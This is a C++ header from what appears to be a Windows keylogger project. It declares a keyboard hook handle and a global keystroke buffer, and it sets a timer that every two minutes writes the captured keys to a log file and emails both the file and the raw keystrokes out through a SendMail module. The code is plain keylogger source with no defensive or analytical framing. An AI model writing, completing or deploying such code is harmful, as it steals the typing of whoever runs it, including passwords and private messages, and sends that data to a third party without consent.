#ifndef KEYBHOOK_H
#define KEYBHOOK_H
    //we are only going to use hooks to record keys

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "SendMail.h"


std::string keylog = "";

void TimerSendMail()
{
        if (keylog.empty())
            return;
        std::string last_file = IO::WriteLog(keylog);

        if (last_file.empty())
        {
            Helper::WriteAppLog("File creation was not successfull. Keylog '" + keylog + "'");
            return ;
        }

        int x = Mail::SendMail("Log [" + last_file + "]" ,
                               "Hi :) \n The file has been attached to this mail :) \n" +
                               "For testing, enjoy: \n"   + keylog ,
                               IO::GetOurPath(true) + last_file ) ;
        if (x!=7) //means if mail has failed
            Helper::WriteAppLog("Mail was not sent! Error code: " +Helper::ToString(x));
        else
            keylog = "";

}

Timer MailTimer(TimerSendMail, 2000* 60 , Timer::Infinite);

HHOOK eHook = NULL;

#endif // KEYBHOOK_H
